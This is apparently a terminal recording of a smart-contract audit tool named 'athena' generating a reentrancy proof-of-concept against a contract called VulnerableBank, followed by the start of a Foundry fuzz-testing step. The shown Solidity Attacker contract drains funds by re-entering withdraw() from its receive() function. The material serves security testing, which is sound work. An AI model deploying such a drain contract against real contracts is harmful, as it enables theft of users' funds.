[16.472547, "o", "  \u001b[1;33m> athena poc --vuln reentrancy --target VulnerableBank\u001b[0m\r\n"]
[17.475193, "o", "\r\n"]
[17.475655, "o", "\u001b[2m  // SPDX-License-Identifier: MIT"]
[17.476024, "o", "\r\n"]
[17.476186, "o", "  contract Attacker {"]
[17.47629, "o", "\r\n"]
[17.476405, "o", "      VulnerableBank bank;"]
[17.476529, "o", "\r\n      function attack() external payable {\r\n"]
[17.47668, "o", "          bank.deposit{value: 1 ether}();\r\n          bank.withdraw();  // triggers reentrancy"]
[17.476721, "o", "\r\n      }"]
[17.476811, "o", "\r\n      receive() external payable {\r\n"]
[17.476982, "o", "          if (address(bank).balance >= 1 ether)\r\n              bank.withdraw();  // re-enter"]
[17.477139, "o", "\r\n      }\r\n  }\u001b[0m\r\n"]
[17.479659, "o", "\r\n  \u001b[0;32m[OK]\u001b[0m PoC generated \u2192 test/Attacker.t.sol\r\n"]
[19.482128, "o", "\u001b[2m\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u001b[0m\r\n\u001b[0;36m\u001b[1m[STEP 5/8]\u001b[0m \u001b[1mFoundry Fuzz Testing\u001b[0m\r\n"]
[19.483658, "o", "\u001b[2m\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u001b[0m"]
